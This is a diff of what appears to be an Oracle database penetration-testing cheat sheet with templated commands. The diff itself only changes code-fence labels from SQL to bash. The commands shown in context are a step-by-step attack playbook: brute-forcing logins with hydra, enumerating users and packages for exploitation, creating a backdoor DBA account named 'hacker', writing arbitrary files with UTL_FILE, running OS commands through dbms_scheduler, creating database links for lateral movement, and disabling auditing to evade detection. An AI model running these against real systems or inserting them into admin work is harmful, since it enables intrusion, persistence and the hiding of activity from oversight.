@@ -51,7 +51,7 @@ sqlplus {{USERNAME:str}}/{{PASSWORD:str}}@{{TARGET:ip}}:{{PORT:port:1521}}/{{SER
 ## connect sysdba privesc
 Connect with full administrative privileges (requires sys credentials).
 
-```sql
+```bash
 CONNECT sys/{{PASSWORD:str}}@{{TARGET:ip}}:{{PORT:port:1521}}/{{SERVICE_NAME:str}} AS SYSDBA;
 ```
 
@@ -73,7 +73,7 @@ hydra -L {{USERS_FILE:file:users.txt}} -P {{PASSWORDS_FILE:file:passwords.txt}} 
 ## get version
 Identify Oracle DB version for CVE matching.
 
-```sql
+```bash
 SELECT * FROM v$version;
 ```
 
@@ -84,7 +84,7 @@ SELECT * FROM v$version;
 ## list users roles
 Enumerate users and their granted roles.
 
-```sql
+```bash
 SELECT * FROM all_users;
 SELECT username, granted_role FROM dba_role_privs;
 ```
@@ -96,7 +96,7 @@ SELECT username, granted_role FROM dba_role_privs;
 ## list tables
 Enumerate accessible tables.
 
-```sql
+```bash
 SELECT table_name FROM all_tables;
 ```
 
@@ -107,7 +107,7 @@ SELECT table_name FROM all_tables;
 ## describe table columns
 Show columns and types of a specific table.
 
-```sql
+```bash
 DESC {{TABLE:str}};
 ```
 
@@ -118,7 +118,7 @@ DESC {{TABLE:str}};
 ## find public privileges misconfig
 Identify tables granted to PUBLIC role.
 
-```sql
+```bash
 SELECT table_name, privilege FROM all_tab_privs WHERE grantee = 'PUBLIC';
 ```
 
@@ -129,7 +129,7 @@ SELECT table_name, privilege FROM all_tab_privs WHERE grantee = 'PUBLIC';
 ## find vulnerable plsql packages
 Identify UTL_FILE / UTL_HTTP packages for exploitation.
 
-```sql
+```bash
 SELECT owner, object_name FROM all_objects WHERE object_type = 'PACKAGE' AND object_name LIKE 'UTL%';
 ```
 
@@ -140,7 +140,7 @@ SELECT owner, object_name FROM all_objects WHERE object_type = 'PACKAGE' AND obj
 ## create backdoor user dba
 Create user with DBA role for persistent access.
 
-```sql
+```bash
 CREATE USER {{USERNAME:str:hacker}} IDENTIFIED BY {{PASSWORD:str:Pwn3d!}};
 GRANT DBA TO {{USERNAME:str:hacker}};
 ```
@@ -152,7 +152,7 @@ GRANT DBA TO {{USERNAME:str:hacker}};
 ## write file utl_file
 Write arbitrary file using UTL_FILE PL/SQL package.
 
-```sql
+```bash
 DECLARE v_file UTL_FILE.FILE_TYPE; BEGIN v_file := UTL_FILE.FOPEN('/tmp', 'pwn.txt', 'W'); UTL_FILE.PUT_LINE(v_file, 'pwned'); UTL_FILE.FCLOSE(v_file); END;
 ```
 
@@ -163,7 +163,7 @@ DECLARE v_file UTL_FILE.FILE_TYPE; BEGIN v_file := UTL_FILE.FOPEN('/tmp', 'pwn.t
 ## exec os command dbms_scheduler
 Run shell commands through Oracle scheduler job.
 
-```sql
+```bash
 EXEC dbms_scheduler.create_job(job_name => 'pwn_job', job_type => 'EXECUTABLE', job_action => '/bin/bash', enabled => TRUE);
 ```
 
@@ -174,7 +174,7 @@ EXEC dbms_scheduler.create_job(job_name => 'pwn_job', job_type => 'EXECUTABLE', 
 ## create db link lateral
 Establish DB link to remote Oracle instance.
 
-```sql
+```bash
 CREATE DATABASE LINK {{LINK_NAME:str:remote_link}} CONNECT TO {{USERNAME:str}} IDENTIFIED BY {{PASSWORD:str}} USING '{{HOST:str}}:{{PORT:port:1521}}/{{SERVICE_NAME:str}}';
 ```
 
@@ -185,7 +185,7 @@ CREATE DATABASE LINK {{LINK_NAME:str:remote_link}} CONNECT TO {{USERNAME:str}} I
 ## disable auditing evasion
 Turn off auditing to evade detection.
 
-```sql
+```bash
 NOAUDIT ALL;
 ```
 
